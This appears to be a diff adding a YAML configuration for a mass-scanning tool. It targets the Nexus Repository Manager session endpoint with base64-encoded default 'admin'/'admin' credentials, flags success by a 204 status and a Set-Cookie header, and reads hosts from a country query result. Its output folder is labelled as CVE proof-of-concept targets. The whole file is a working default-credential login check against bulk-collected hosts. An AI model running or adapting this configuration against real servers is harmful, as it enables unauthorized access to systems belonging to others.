@@ -1,0 +1,17 @@
+targetPath: /service/rapture/session
+targetMethod: get
+targetTimeout: 1
+targetProfixs:
+    http: 127.0.0.1:7890
+    https: 127.0.0.1:7890
+targetAllowRedirects: false
+targetHeaders:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+targetJson:
+targetData: username=YWRtaW4%3D&password=YWRtaW4%3D
+targetReExpression:
+    respStatusCode: 204
+    respHeaders: Set-Cookie
+targetDir: ../countryQueryResult/
+targetOutputDir: ../2CVE漏洞POC目标/nexusSwagger2/
+targetRestText: True
